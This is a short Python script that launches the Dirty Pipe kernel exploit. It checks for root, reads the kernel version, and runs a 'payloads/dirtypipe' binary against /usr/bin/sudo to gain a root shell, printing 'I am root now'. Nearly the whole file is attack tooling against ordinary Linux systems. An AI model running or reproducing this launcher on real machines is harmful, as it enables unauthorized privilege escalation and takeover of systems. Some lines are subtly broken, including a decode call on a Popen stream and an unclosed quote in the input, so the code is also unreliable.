#imports

import subprocess
import os

def checkroot():
    root_status = subprocess.run(['whoami'], stdout=subprocess.PIPE).stdout.decode('utf-8').strip()
    if root_status == "root": return True
    else: return False

def runcommand(command):
    command = command.split(" ")
    return subprocess.Popen(command,stdin=subprocess.PIPE, stdout=subprocess.PIPE).stdout.decode('utf-8')

version_info = '.'.join(subprocess.run(['uname', '-r'], stdout=subprocess.PIPE).stdout.decode('utf-8').split(".")[:2])



#dirtypipe = runcommand("payloads/dirtypipe /usr/bin/sudo")
dirtypipe = subprocess.run(["payloads/dirtypipe","/usr/bin/sudo"],stdout=subprocess.PIPE,input="whoami\necho 'Hi! I am root now.",encoding="utf-8")
print(dirtypipe.stdout)
